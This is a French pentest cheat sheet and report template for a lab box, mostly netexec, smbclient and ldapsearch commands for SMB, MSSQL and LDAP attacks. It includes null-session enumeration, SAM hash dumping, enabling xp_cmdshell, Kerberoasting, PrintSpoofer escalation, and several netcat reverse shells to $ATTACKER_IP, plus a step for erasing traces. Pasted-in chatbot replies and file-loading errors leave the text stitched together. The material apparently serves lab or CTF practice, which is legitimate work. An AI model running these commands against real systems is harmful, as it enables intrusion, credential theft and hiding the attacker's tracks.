# Challenge 9 - Feast

Rapport de Pentest pour Test

### Informations de base

* **Nom de la box**: Test
* **Adresse IP**: 123.123.123.123
* **Date**: 3/23/2025

### Phases de Pentest

#### 1. Reconnaissance

* Scan Nmap initial: `nmap -sC -sV -oA initial 123.123.123.123`
* Scan complet: `nmap -p- --min-rate 10000 -oA full 123.123.123.123`
* Vérification des versions des services découverts

#### 2. Énumération

* Énumération des utilisateurs, groupes, et autres informations pertinentes
* Recherche de vulnérabilités connues pour les services identifiés

### Services Détailés

## **SMB Enumeration & Exploitation Checklist**

### 🔍 **Énumération & Connexion**

```bash
# Tester la session null
smbclient -N -U "" -L \\<IP>
smbclient -N -U "test" -L \\<IP>
smbclient -N -U "Guest" -L \\<IP>

# Télécharger tous les fichiers d'un partage SMB
nxc smb $IP -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True

# Énumérer les partages SMB
netexec smb $IP -u '' -p '' --shares

# Lister les utilisateurs SMB
netexec smb $IP -u '' -p '' --users | grep -E "SMB\s+.*\s+[A-Za-z]+\.[A-Za-z]+" | awk '{print $5}' > users.txt

# Bruteforce des RID pour découvrir des utilisateurs supplémentaires
netexec smb $IP -u '' -p '' --rid-brute

# Tester pour une exécution de commande à distance (RCE)
nxc smb $IP -u 'Administrator' -p 'P@ssw0rd' -x whoami
```

### 🔓 **Privilèges & Exécution de commandes**

```bash
# Récupérer les hashes du SAM
nxc smb $IP -u 'UserName' -p 'PASSWORDHERE' --sam

# Extraire les hashes et les noms d'utilisateurs de secretsdump
grep -oP '^[^:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' secretsdump.txt | awk -F: '{print $1}' > secretsdumpusernames.txt
grep -oP '^[^:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' secretsdump.txt | awk -F: '{print $4}' > secretsdumphashes.txt
```

### 📂 **Transfert de fichiers**

```bash
# Télécharger des fichiers depuis un partage SMB
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.184/Snaffler.exe

# Copier un fichier vers un partage SMB
smbclient \\\\$IP\\share -U "$USER" -P "$PASSWORD" -c "put /path/to/local/file /remote/path/remote_file.txt"
```

### 🚀 **Reverse Shell**

```bash
# Déposer un reverse shell sur la cible via SMB
nxc smb $IP -u '$USER' -p '$PASSWORD' --put-file /path/to/nc.exe /tmp/nc.exe

# Lancer un reverse shell via netcat
nxc smb $IP -u '$USER' -p '$PASSWORD' -x "C:\tmp\nc.exe $ATTACKER_IP 1234 -e cmd"
```

### 🚨 **Autres attaques SMB**

```bash
# Tester pour l'accès à distance via SMB aux répertoires partagés
smbclient -N -U "user" -L \\<IP>
```

Erreur lors du chargement du fichier: /exploitationDetails/DNS.md

## **MSSQL Enumeration & Exploitation Checklist**

### 🔍 Enumération & Connexion

```bash
# Tester l'accès (y compris en null session)
netexec mssql $IP -u '' -p ''
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD'

# Découvrir les utilisateurs via RID bruteforce
nxc mssql $IP -u $USER -p '$PASSWORD' --rid-brute

# Lister les bases de données
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD' -q "SELECT name FROM sys.databases"
```

### 🔓 Privilèges & Exécution de commandes

```bash
# Activer xp_cmdshell
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD' --enable-xp-cmdshell

# Exécuter une commande via xp_cmdshell
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD' -x "whoami /all"

# Vérifier les élévations de privilèges possibles
netexec mssql $IP -u $USER -p '$PASSWORD' -M mssql_priv

# Vérifier les permissions d'usurpation d'identité (impersonation)
netexec mssql $IP -u $USER -p '$PASSWORD' -M mssql_priv -o ACTION=privesc
```

### 📂 Transfert de fichiers

```bash
# Envoyer un fichier vers la cible
nxc mssql $IP -u $USER -p '$PASSWORD' --put-file /tmp/local_file C:\\Windows\\Temp\\remote_file.txt

# Télécharger un fichier depuis la cible
nxc mssql $IP -u $USER -p '$PASSWORD' --get-file C:\\Windows\\Temp\\remote_file.txt /tmp/local_file
```

### 🚀 Reverse Shell

```bash
# Déposer netcat sur la cible
nxc mssql $IP -u $USER -p '$PASSWORD' --put-file nc.exe

# Lancer un reverse shell via netcat
nxc mssql $IP -u $USER -p '$PASSWORD' -x "C:\Windows\Temp\nc.exe $ATTACKER_IP 1234 -e cmd"

# Si whoami montre un token d'impersonation -> exploit PrintSpoofer
nxc mssql $IP -u $USER -p '$PASSWORD' -x 'C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe $ATTACKER_IP 1234 -e cmd"'

# Reverse Shell sur Active Directory (Base64 PowerShell)
nxc mssql $IP -u '' -p '' -x '<PAYLOAD REVERSE SHELL BASE64 HERE>'
```

## **LDAP Enumeration & Exploitation Checklist**

### 🔍 **Énumération & Connexion**

```bash
# Tester l'accès à LDAP avec un utilisateur et un mot de passe
nxc ldap $IP -u '$USER' -p '$PASSWORD'

# Lister les utilisateurs LDAP
nxc ldap $IP -u '$USER' -p '$PASSWORD' --users

# Lister les groupes LDAP
nxc ldap $IP -u '$USER' -p '$PASSWORD' --groups

# Lister les GPOs LDAP
nxc ldap $IP -u '$USER' -p '$PASSWORD' --gpos

# Rechercher tous les objets avec un filtre générique
ldapsearch -v -x -b "DC=example,DC=com" -H "ldap://$IP" "(objectclass=*)"

# Rechercher des informations sur les utilisateurs spécifiques (par exemple, SAMAccountName)
ldapsearch -v -x -b "DC=example,DC=com" -H "ldap://$IP" "(objectclass=*)" | grep samaccountname
```

#### 🔓 **Privilèges & Exécution de commandes**

```bash
# Tester ASREP Roasting (pour attaquer le protocole Kerberos)
nxc ldap $IP -u $USER -p '' --asreproast output.txt
# Cracker le hash avec hashcat
# hashcat -m18200 output.txt wordlist

# Tester Kerberoasting pour extraire des hashes de service Kerberos
nxc ldap $IP -u '$USER' -p '$PASSWORD' --kerberoasting output.txt
# Cracker les hashes avec hashcat
# hashcat -m13100 output.txt wordlist.txt

# Récupérer la description des utilisateurs
nxc ldap $IP -u '$USER' -p '$PASSWORD' -M get-desc-users

# Utiliser BloodHound pour collecter des informations sur l'AD
nxc ldap $IP -u 'users.txt' -p 'passwords.txt' --bloodhound -c all --dns-server $DNS_SERVER
```

### 📂 **Transfert de fichiers**

```bash
# Envoyer un fichier vers un serveur LDAP (exemple générique, adapter pour d'autres types de transfert)
nxc ldap $IP -u '$USER' -p '$PASSWORD' --put-file /tmp/local_file /remote/path/remote_file.txt

# Télécharger un fichier depuis un serveur LDAP (si autorisé)
nxc ldap $IP -u '$USER' -p '$PASSWORD' --get-file /remote/path/remote_file.txt /tmp/local_file
```

### 🚀 **Reverse Shell**

```bash
# Déposer un exécutable (ex: nc.exe pour un reverse shell) sur la cible
nxc ldap $IP -u '$USER' -p '$PASSWORD' --put-file nc.exe /tmp/nc.exe

# Lancer un reverse shell via netcat
nxc ldap $IP -u '$USER' -p '$PASSWORD' -x "C:\tmp\nc.exe $ATTACKER_IP 1234 -e cmd"

# Exploiter les informations d'impersonation ou les privilèges élevés si présents
nxc ldap $IP -u '$USER' -p '$PASSWORD' -x 'C:\tmp\PrintSpoofer64.exe -c "C:\tmp\nc.exe $ATTACKER_IP 1234 -e cmd"'

# Reverse Shell via PowerShell (Base64 encodé)
nxc ldap $IP -u '$USER' -p '$PASSWORD' -x '<PAYLOAD REVERSE SHELL BASE64 HERE>'
```

### 🔧 **Autres attaques LDAP et recherche d’informations sensibles**

```bash
# Recherche de tous les utilisateurs ou d'informations particulières (ex: description)
ldapsearch -v -x -b "DC=example,DC=com" -H "ldap://$IP" "(objectclass=*)" | grep description

# Utiliser un wildcard pour rechercher des informations sur un domaine complet
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$IP" "(objectclass=*)"
```

Erreur lors du chargement du fichier: /exploitationDetails/SMTP.md

#### 3. Exploitation

* Tentatives d'exploitation des vulnérabilités découvertes
* Obtention d'un premier accès à la cible

#### 4. Post-Exploitation

* Maintien de l'accès
* Élévation de privilèges
* Extraction de données sensibles

#### 5. Nettoyage

* Suppression des traces laissées sur la cible
* Documentation des vulnérabilités et méthodes d'exploitation

Bonne idée ! Voici une version avec des titres plus petits (`###`) pour une meilleure lisibilité.

***

#### 🔍 Tester la session null

```bash
smbclient -N -U "" -L \\<IP>
smbclient -N -U "test" -L \\<IP>
smbclient -N -U "Guest" -L \\<IP>
```

```
# Output ici
```

#### 📥 Télécharger tous les fichiers d'un partage SMB

```bash
nxc smb $IP -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

```
# Output ici
```

#### 📂 Énumérer les partages SMB

```bash
netexec smb $IP -u '' -p '' --shares
```

```
# Output ici
```

#### 👥 Lister les utilisateurs SMB

```bash
netexec smb $IP -u '' -p '' --users | grep -E "SMB\s+.*\s+[A-Za-z]+\.[A-Za-z]+" | awk '{print $5}' > users.txt
```

```
# Output ici
```

#### 🔑 Bruteforce des RID pour découvrir des utilisateurs supplémentaires

```bash
netexec smb $IP -u '' -p '' --rid-brute
```

```
# Output ici
```

#### ⚡ Tester pour une exécution de commande à distance (RCE)

```bash
nxc smb $IP -u 'Administrator' -p 'P@ssw0rd' -x whoami
```

```
# Output ici
```

***

Là, c'est plus compact et toujours aussi lisible. Tu veux d'autres améliorations ? 😃Suppression des traces laissées sur la cible

* Documentation des vulnérabilités et méthodes d'exploitation
